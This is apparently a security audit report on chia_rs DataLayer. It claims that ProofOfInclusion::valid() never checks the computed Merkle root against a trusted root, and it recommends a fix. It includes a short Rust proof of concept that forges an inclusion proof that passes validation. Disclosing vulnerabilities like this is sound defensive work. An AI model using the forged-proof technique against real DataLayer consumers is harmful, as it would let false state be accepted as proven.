### Title
`ProofOfInclusion::valid()` Never Checks Computed Root Against a Trusted Root — Forged DataLayer Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` only verifies internal self-consistency of the proof chain. Its final comparison is tautological: it compares the computed root against `self.root_hash()`, which is itself derived from the last `combined_hash` field inside the attacker-supplied proof. No external trusted root is ever consulted. An attacker can fabricate a `ProofOfInclusion` for any arbitrary `node_hash` (any key-value pair) and any chain of internally consistent layers, and `valid()` will return `true`, falsely asserting inclusion in a DataLayer tree.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← comes from the proof itself (attacker-controlled)
    } else {
        self.node_hash
    }
}

pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← tautological: always true when loop completes
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which equals the last `layer.combined_hash` (the loop only continues when they are equal). `self.root_hash()` returns exactly that same `last.combined_hash`. Therefore the final comparison `existing_hash == self.root_hash()` is always `true` when the loop completes without an early return.

The function never accepts a `trusted_root` parameter and never compares the computed root against any externally stored DataLayer tree root. The analog to the reported vulnerability is direct:

| Reported (Gondi) | chia_rs |
|---|---|
| `executionData.tokenId` (user input) used instead of `loan.nftCollateralTokenId` (trusted state) | `self.root_hash()` (derived from user-supplied proof bytes) used instead of a trusted/stored DataLayer root |
| Lender offer validation passes for a different NFT | Proof-of-inclusion validation passes for a fabricated leaf |

The struct is `Streamable` (deserializable from raw bytes) and is exposed directly to Python via `py_valid()`:

```rust
#[pyo3(name = "valid")]
pub fn py_valid(&self) -> bool {
    self.valid()
}
```

The Python test suite calls `proof_of_inclusion.valid()` without any separate root check, confirming the API is used this way in practice.

### Impact Explanation

An attacker who can supply a `ProofOfInclusion` object (via the Python binding, the `Streamable` deserializer, or any DataLayer RPC that accepts proof bytes) can:

1. Choose any arbitrary `node_hash` (the leaf they wish to falsely prove is in the tree).
2. Construct a chain of `ProofOfInclusionLayer` entries where each `combined_hash` is correctly computed from the previous hash and a chosen `other_hash`.
3. Submit this fabricated proof; `valid()` returns `true`.

Any DataLayer consumer that calls `proof.valid()` and trusts the result as proof of inclusion in a specific tree will accept forged state. This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

### Likelihood Explanation

The `ProofOfInclusion` struct is `Streamable` and exposed via Python bindings. The API surface is reachable by any unprivileged caller who can supply proof bytes. The naming `valid()` strongly implies full validation, making it likely that callers rely on it exclusively without a separate root check. The existing test suite confirms this usage pattern.

### Recommendation

`valid()` must accept and compare against an externally trusted root:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    &existing_hash == trusted_root   // ← compare against externally trusted root
}
```

All call sites must pass the root hash obtained from a trusted source (e.g., the on-chain DataLayer coin's committed root, not from the proof itself).

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};

fn forge_proof(fake_node_hash: Hash, fake_other_hash: Hash) -> ProofOfInclusion {
    // Compute what combined_hash must be for the layer to be internally consistent
    let combined = chia_datalayer::calculate_internal_hash(
        &fake_node_hash,
        Side::Left,
        &fake_other_hash,
    );
    ProofOfInclusion {
        node_hash: fake_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Left,
            other_hash: fake_other_hash,
            combined_hash: combined,   // attacker sets this to match
        }],
    }
}

fn main() {
    let fake_leaf = [0xAA_u8; 32];
    let fake_other = [0xBB_u8; 32];
    let proof = forge_proof(fake_leaf.into(), fake_other.into());
    // valid() returns true for a completely fabricated proof
    assert!(proof.valid());
    // root_hash() returns attacker-chosen value, not any real tree root
    println!("Forged root: {:?}", proof.root_hash());
}
```

The forged proof passes `valid()` despite `fake_leaf` never having been inserted into any `MerkleBlob`.
